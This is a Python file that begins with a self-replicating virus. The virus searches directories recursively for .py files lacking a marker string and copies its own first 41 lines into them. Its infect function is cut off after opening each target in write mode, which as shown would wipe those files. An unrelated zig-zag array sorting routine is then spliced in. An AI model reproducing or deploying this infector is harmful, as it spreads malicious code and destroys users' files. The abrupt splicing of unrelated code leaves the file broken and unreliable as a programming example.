#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
def zigZag(arr, n):
    # use sort function to sort the array
    arr.sort()
    # traverse the array from 1 to n-1
    for i in range(1, n-1, 2):
        # swap value of current element with next element
        arr[i], arr[i+1] = arr[i+1], arr[i]
    # print the array
    print(arr)


# Driver program
if __name__ == "__main__":
    arr = [4, 3, 7, 8, 6, 2, 1]
    n = len(arr)
    zigZag(arr, n)
# 1 2 3 4 6 7 8
# 1
#     3
#   2
#         6
#       4
#            8
#          7
# Time Complexity: O(N*log(N)) because sorting is used
# Space Complexity: O(1)